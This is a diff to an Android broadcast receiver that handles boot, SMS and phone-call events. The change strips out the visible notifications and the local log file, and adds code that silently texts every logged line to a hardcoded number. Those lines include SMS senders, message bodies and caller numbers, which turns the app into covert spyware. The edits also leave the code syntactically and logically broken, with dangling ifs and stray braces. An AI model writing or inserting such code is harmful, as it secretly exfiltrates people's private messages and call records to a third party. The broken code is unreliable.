@@ -35,9 +35,9 @@ public class StartUpReceiver extends BroadcastReceiver
 
         Cont = context;
         String Action = intent.getAction ();
-        //System.out.println ("****** Broadcast received " + Action);
+
         if (Action == null)
-           // ShowMessage ("No Action ?????");
+
         if (Action == Intent.ACTION_BOOT_COMPLETED)
             DoBoot ();
         if (Action == "android.provider.Telephony.SMS_RECEIVED")
@@ -49,14 +49,13 @@ public class StartUpReceiver extends BroadcastReceiver
 
     void DoBoot ()
     {
-        //ShowMessage ("Boot Completed... I started");
         WriteLog ("Application started on boot");
         WriteLog ("--");
     }
 
     void DoSMS (Intent SmsInt)
     {
-       // ShowMessage ("SMS received");
+
         Bundle bundle = SmsInt.getExtras ();
         SmsMessage[] Messages = null;
         String SmsSender;
@@ -80,11 +79,11 @@ public class StartUpReceiver extends BroadcastReceiver
                     WriteLog ("SMS message: " + SmsBody);
                 }
                 WriteLog ("--");
-              //  BroadcastMessage ("SMS", ToActivity);
+
             }
             catch(Exception e)
             {
-              //  System.out.println ("*** Exception Here???");
+
             }
 
 
@@ -93,80 +92,49 @@ public class StartUpReceiver extends BroadcastReceiver
 
     void DoPhone (Intent PhoneInt)
     {
-      //  ShowMessage ("Phone Event...");
+
         String State = PhoneInt.getStringExtra (TelephonyManager.EXTRA_STATE);
         String Caller= PhoneInt.getStringExtra (TelephonyManager.EXTRA_INCOMING_NUMBER);
         if (State.equals (TelephonyManager.EXTRA_STATE_RINGING))
         {
-          //  ShowMessage ("Phone Ringing : " + Caller);
+
             if (Caller != null)
             {
                 WriteLog ("Phone Ringing : " + Caller);
-              //  BroadcastMessage ("PHONE", "Call from " + Caller);
+
             }
         }
         if (State.equals (TelephonyManager.EXTRA_STATE_OFFHOOK))
         {
-          //  ShowMessage ("Off Hook: " + Caller);
+
             if (Caller != null)
             {
                 WriteLog ("Off Hook: " + Caller);
-              //  BroadcastMessage ("PHONE", "Speaking to " + Caller);
+
             }
         }
         if (State.equals (TelephonyManager.EXTRA_STATE_IDLE))
         {
-           // ShowMessage ("Phone Rests: " + Caller);
+
             if (Caller != null)
             {
                 WriteLog ("Phone Rests: " + Caller);
                 WriteLog ("--");
-             //   BroadcastMessage ("PHONE", "Call to " + Caller + " ended" );
+
             }
         }
 
     }
 
-    void ShowMessage (String Mess)
-    {
-        Toast Tst = Toast.makeText (Cont, Mess, Toast.LENGTH_LONG);
-        Tst.show ();
-    }
-
     void WriteLog (String Line)
     {
-        String FName = Environment.getExternalStoragePublicDirectory (Environment.DIRECTORY_DOWNLOADS).getPath () +
-                "/BroadReport.txt";
 
-        try
-        {
-            PrintWriter out = new PrintWriter (new BufferedWriter (new FileWriter (FName, true)));
             String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());
 
-            if (Line.equals ("--"))
-                out.println ("----------------------------------------------------------------------------\n");
-            else
-                out.println (Line + "   (" + TimeStamp + ")");
             String p = "123456789";
             String line = Line + "   (" + TimeStamp + ")";
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(p, null, line, null, null);
-            out.close ();
-        }
-        catch (IOException e)
-        {
-           // ShowMessage ("What??? Exception??? Why??? : " + e.getMessage ());
-        }
-
-    }
-
-    void BroadcastMessage(String Type, String Mess)
-    {
-
-        Intent BroadInt = new Intent ("Fantom-Message");
-        BroadInt.putExtra ("To:", Type);
-        BroadInt.putExtra ("Message:", Mess);
-        LocalBroadcastManager.getInstance (Cont).sendBroadcast (BroadInt);
 
     }
 
